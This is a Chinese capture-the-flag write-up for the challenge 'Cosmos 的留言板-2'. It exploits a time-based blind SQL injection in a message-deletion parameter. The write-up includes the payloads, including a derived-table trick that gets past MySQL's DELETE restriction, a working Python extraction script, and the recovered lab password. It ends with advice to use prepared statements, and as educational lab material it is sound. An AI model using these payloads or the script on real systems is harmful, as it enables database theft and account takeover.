# Cosmos 的留言板-2

## 题目简述

删除留言接口把 `delete_id` 直接拼进 SQL。页面没有报错或查询结果回显，但可以通过 `IF(..., SLEEP(3), 0)` 构造时间盲注，逐字符枚举数据库名、表结构以及 Cosmos 的登录密码。

## 解题过程

对删除请求测试如下条件：

```sql
-1 OR IF(1=1, SLEEP(3), 0)
```

响应稳定延迟约 3 秒，说明 `delete_id` 可注入。由于注入点位于对 `messages` 表的 `DELETE` 操作中，MySQL 不允许在同一层直接读取正在修改的目标表；把查询再包一层派生表即可规避限制：

```sql
-1 OR IF(
  (SELECT t.a FROM (
    SELECT ASCII(MID((SELECT DATABASE()), 1, 1)) AS a
  ) AS t) = 98,
  SLEEP(3),
  0
)
```

将待查表达式、字符位置和猜测值参数化，按照响应耗时判断当前字符：

```python
import string
import time
import requests

alphabet = string.ascii_letters + string.digits + ":-_,$"
session = requests.Session()

def extract(expression, length):
    answer = ""
    for position in range(1, length + 1):
        for char in alphabet:
            inner = (
                "SELECT ASCII(MID((" + expression + "),"
                + str(position) + ",1)) AS a"
            )
            payload = (
                "-1 OR IF((SELECT t.a FROM (" + inner
                + ")t)=" + str(ord(char)) + ",SLEEP(3),0)"
            )
            started = time.monotonic()
            session.get("http://target/delete.php", params={"delete_id": payload})
            if time.monotonic() - started > 2.5:
                answer += char
                print(answer)
                break
    return answer
```

依次枚举得到：

```text
database: babysql
tables: messages,user
user columns: id,name,password
```

最后读取 `user` 表中 `name='cosmos'` 的记录，得到：

```text
cosmos:f1FXOCnj26Fkadzt4Sqynf6O7CgR
```

使用该密码登录 Cosmos 账户，页面返回 flag。

## 方法总结

- 核心漏洞：删除参数未经参数化处理，且数据库账号允许读取用户表。
- 关键细节：在 `DELETE messages` 中回查 `messages` 时，需要额外的派生表层规避 MySQL 的目标表限制。
- 复用要点：时间盲注应采用稳定时钟和阈值，并限制候选字符集；真实系统应使用预编译语句，从根源上消除拼接注入。
